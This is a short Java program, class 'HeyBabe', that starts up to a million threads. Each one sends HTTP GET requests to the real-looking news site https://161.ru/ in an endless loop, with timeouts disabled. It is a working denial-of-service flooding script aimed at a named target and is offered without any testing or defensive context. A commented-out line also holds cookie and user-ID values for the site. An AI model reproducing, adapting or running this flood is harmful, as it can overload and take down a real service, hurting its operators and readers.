import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;

public class HeyBabe implements Runnable {

    public static void main(String[] args) throws Exception {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 1000000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() throws UnirestException {
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = Unirest.get("https://161.ru/")
//                .header("Cookie", "jtnews_ab_24=A; jtnews_ab_29=A; jtnews_ab_55=B; ngs_uid=wxPcGmIaAs0639/9BytOAg==")
                .asString();
    }

    public static void loop() throws UnirestException {
        while (true) {
            hey();
            System.out.println("+");
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (UnirestException e) {
            e.printStackTrace();
        }
    }
}
